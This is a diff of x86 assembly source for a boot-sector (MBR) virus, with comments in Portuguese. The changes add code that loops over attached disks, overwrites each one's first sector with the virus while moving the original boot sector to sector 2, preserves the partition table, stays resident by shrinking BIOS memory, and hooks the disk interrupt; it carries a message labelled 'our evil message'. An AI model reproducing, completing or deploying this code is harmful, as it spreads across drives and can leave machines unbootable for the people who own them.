@@ -37,22 +37,25 @@ loop_over_disks:
         int 13h
 
         jc next ; Carry = 1 - Disco não existe
-
-        ; O bootsector original é enviado para o sector 2
-        mov ah, 0x03
-        mov al, 0x02
-        xor ch, ch
-        mov cl, 0x01
-        mov bx, 0x7c00
-        int 13h
         
+        mov si, part_table + 0x200    ; source address 0x7e00 + part_table
+        mov di, part_table            ; dest address 0x7c00 + part_table
+        mov cx, 74                    ; its size it 74 bytes
+        rep movsb
         
         ; Escrevemos o codigo infectado no DL (Driver) definido (iteração) Sector 1
         mov ah, 0x03
         mov al, 0x01
         xor ch, ch
         mov cl, 0x01
+        mov bx, 0x7c00
+        int 13h
 
+        ; O bootsector original é enviado para o sector 2
+        mov ah, 0x03
+        mov al, 0x01
+        xor ch, ch
+        mov cl, 0x02
         mov bx, 0x7e00
         int 13h
 
@@ -64,23 +67,25 @@ memory_persistence:
     xor ax, ax
     mov ds, ax
 
-    dec word [ds:0x0413] ; Reduz 1 KB de Memoria
-    mov ax, [ds:0x0413]  ; AX recebe a quantidade de memoria
-    shl ax, 6            ; Dá um ShiftLeft para receber o segmento do topo
-    mov es, ax           ; ES = Segment Register
+    dec word [ds:0x0413]    ; Reduz 1 KB de Memoria
+    mov ax, [ds:0x0413]     ; AX recebe a quantidade de memoria
+    shl ax, 6               ; Dá um ShiftLeft para receber o segmento do topo
+    mov es, ax              ; ES = Segment Register
 
     mov dl, [DriverID]
-    mov si, transfer_bytes ; da função transfer_bytes
-    xor di, di             ; para di = 0x00 
+    mov si, transfer_bytes  ; da função transfer_bytes
+    xor di, di              ; para di = 0x00 
 
-    mov cx, transfer_end       ;   end_cpy = Fim da copia 
-    sub cx, transfer_bytes; - transfer_bytes temos o tamanho dos codigo a ser transferido
-    rep movsb      ; com a instrução rep e cx = quantidade de bytes a serem transferidos
-                   ; copiamos as instruções para o segmento
+    mov cx, transfer_end    ;   end_cpy = Fim da copia 
+    sub cx, transfer_bytes  ; - transfer_bytes temos o tamanho dos codigo a ser transferido
+    
+    rep movsb               ; com a instrução rep e cx = quantidade de bytes a serem transferidos
+                            ; copiamos as instruções para o segmento
 
-    push es ; Sempre lembrar que ES é um registrador de segmento
+    push es                 ; Sempre lembrar que ES é um registrador de segmento
     push word 0x0000
     retf
+
 transfer_bytes:
     xor ax, ax
     mov es, ax
@@ -94,8 +99,8 @@ transfer_bytes:
 
     ; Inclusão de Interrupt Handler (Interrupt Vector Table = IVT)
     ; nesse exemplo eu vou utilizar a interrupção 0x16 (Keyboard I/O)
-    mov ax, word [es:0x16*4]   ; segmento
-    mov bx, word [es:0x16*4+2] ; offset
+    mov ax, word [es:0x13*4]   ; segmento
+    mov bx, word [es:0x13*4+2] ; offset
 
     mov ax, interrupt       ; Hookando o endereço de Interrupt no ax
     sub ax, transfer_bytes  
@@ -110,8 +115,12 @@ transfer_bytes:
 
 ; Codigo Hookado ao IVT
 interrupt:
-    
+    pushf
+    popf
+    retf
 
+msg:
+    db "Vai Chorar ?"                        ; our evil message
 ; FIM do transfer_bytes
 transfer_end:
 
@@ -126,14 +135,13 @@ disks:
 db "Qual o proposito de existência humana?(ಥ _ ಥ)"
 
 ; Padding de BIOS
-padding:
-    times (0x1be - ($-$$)) db 0
-    db 80h
-    db 0,2,0
-    db 0F0H
-    db 0FFH, 0FFh, 0FFH
-    dd 1
-    dd (20*16*63-1)
-    
-    times (16*3) db 0
-    dw 0xAA55
+times (0x1b4 - ($-$$)) nop  
+
+part_table:
+times 10 db 0
+times 16 db 0
+times 16 db 0
+times 16 db 0
+times 16 db 0
+
+dw 0xAA55
